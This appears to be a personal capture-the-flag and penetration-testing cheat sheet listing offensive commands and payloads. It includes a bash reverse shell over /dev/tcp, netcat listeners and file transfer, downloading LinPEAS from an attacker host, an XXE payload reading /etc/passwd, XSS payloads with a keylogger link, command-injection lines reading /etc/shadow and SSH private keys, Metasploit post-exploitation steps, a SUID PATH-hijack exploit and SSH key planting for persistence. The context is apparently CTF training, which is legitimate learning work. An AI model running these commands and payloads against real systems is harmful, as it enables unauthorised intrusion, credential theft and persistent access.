# docs-ctf-cheatsheet
## NMAP
```bash
nmap -sC -sV -oA nmap/initial IPADRESS
nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS
```
> -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one\
-p- : Enables scanning across all ports, not just the top 1000\
-sC : Scan with default NSE scripts. Considered useful for discovery and safe\
-sV : Attempts to determine the version of the service running on port\
-oA [dir] all output to [dir]

## REVERSE SHELL
1. setup listener on my machine:
nc -lvnp 8081
2. go to\
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\
and try them out on target machine

### simple bash reverse shell
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

## INTERACTIVE SHELL
target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
attacker: `stty raw -echo`, `fg`, <kbd>Enter</kbd>, <kbd>Enter</kbd>

## NETCAT
### send data

reciever:
```bash
nc -l -p 1234 > FILE.NAME
```
(sometimes netcat instead of nc!)


sender:
```bash
nc -w 3 DESTINATION 1234 < FILE.NAME
```

## HTTPSERVER
### send data
sender:
```bash
python -m SimpleHTTPServer 8083
python3 -m http.server 8083
```
reciever:
```bash
curl IPADRESSSENDER:8083/FILE.NAME
curl 10.10.IP.IP:8083/linpeas.sh > lp.sh
wget IPADRESSSENDER:8083/FILE.NAME
```

## MSF
search: `search [SEARCHTERM]`\
send data: `upload /path/to/file`\
run exploit in background and enter the session: `run -j`\
sessions: `sessions -i [session id]`\
get "normal" shell: `shell`\
move out of a session: <kbd>CTRL</kbd> + <kbd>z</kbd>

## CHECK IF SOMETHING IS EXECUTED
attacker: `sudo tcpdump ip proto \icmp -i tun0`\
target: `ping [local tun0 ip] -c 1`

## BROKEN AUTHENTICATION:
password guessing/bruteforce\
weak session cookies\
registration of existing user “ admin” (with space) and gain all rights of “admin”
1. try register as randomname
2. if “randomname has already been taken” try register with “ randomname” and see what happens

## XML EXTERNAL ENTITY (XXE):
try :
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
```xml
<!DOCTYPE replace [<!ENTITY name "success"> ]>
 <userInfo>
  <firstName>xxe</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

## XSS PAYLOADS:
```html
<script>alert(“Hello World”)</script>
document.write
<img src=x onerror=alert(2)>
```
* XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
* Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner

## COMMAND INJECTION PAYLOADS
### Linux
```bash
whoami
id
ifconfig
ip addr
uname -a
ps -ef
cat /etc/passwd
cat /etc/shadow
cat /home/USERNAME/.ssh/id_rsa
```
### Windows
``` shell
whoami
ver
ipconfig
tasklist
netstat -an
```

## POST EXPLOITATION WINDOWS
```powershell
Get-WmiObject -Class win32_OperatingSystem (Power Shell)
run post/windows/gather/checkvm (Metasploit) - check if vm
run post/multi/recon/local_exploit_suggester (Metasploit)
run post/windows/manage/enable_rdp (Metasploit)
ipconfig
try migrate spoolsv.exe
getuid
sysinfo
getprivs
run autoroute -s [SUBNET IP] -n 255.255.255.0
```

## LIST SUDO COMMANDS
```bash
sudo -l
```

## Enummeration Scripts
### Local
* LinEnum
* LinPEAS
* WinPEAS
### Remote
* enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA


## SMBClient
```bash
smbclient //[IP]/[DIRECTORY] -U [USERNAME]
```

## NFS
```bash
sudo mount -t nfs [IP]:[tragetdirectory] /tmp/mount/ -nolock
```

## SUID
find SUID : `find / -perm -u=s -type f 2>/dev/null`\
Exploit /usr/bin/menu with SUID :
```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## ADD DOMAIN
```bash
sudo nano /etc/hosts
```
> add [IPADRESS] [DOMAIN], save and it should work!

## SSH:
```bash
ssh-keygen -f [NAME]
```
>now i can write the [NAME].pub file content (except for the last part with my USER@IP) and add “ssh-rsa “ before the key if not there) to the /home/[USER]/.ssh/authorized_keys/, then
```bash
ssh -i [NAME] [USER]@[IP]
```

## PYTHON VIRTUAL ENVIRONMENT
env init: `python3 -m venv [NAME UMGEBUNG]`\
env load: `source [NAME UMGEBUNG]/bin/activate`\
packet install (in env): `pip3 install [PACKET NAME]`\
env exit: `deactivate`\
show installed packets: `pip3 freeze`

## JAVA-VERSION ARCH LINUX
some programs run only with a certain jre, so you can use the following to set the default jre on your system:
```bash
sudo archlinux-java set java-8-openjdk/jre
```

## TMUX
start new session: `tmux new -s [NAME]`
new panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>c</kbd>\
rename panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>,</kbd>\
split panel vertical: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>%</kbd>\
split panel horizontal: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>“</kbd>\
navigate between panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>\
resize panel: hold <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>

## GOBUSTER
```bash
./gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
maybe mit +x php
```

## MYSQL
```bash
mysql -u [USER] -p'[PASSWORD]'
```

## HASHCAT (Windows)
```shell
.\hashcat.exe -a [ATTACKTYPE] -m [HASHTYPE] [PATHTOHASHES] [PATHTODICTIONARY] -r [PATHTORULE]
```
ATTACKTYPE : 0 for dictionary/dictionary-rule attack
HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_hashes
PATHTORULE : \rules\best64.rule is good

## SQLMAP
```bash
sqlmap -r [FULLFILEPATHTOREQUEST] -dump
```
> --dbs : dump database names\
-D [DB] : choose Target Database\
-T [TABLE] : choose Target Table\
-dump : dump target table\
 --dbms=[DBTYPE] : choose DBType (mysql)
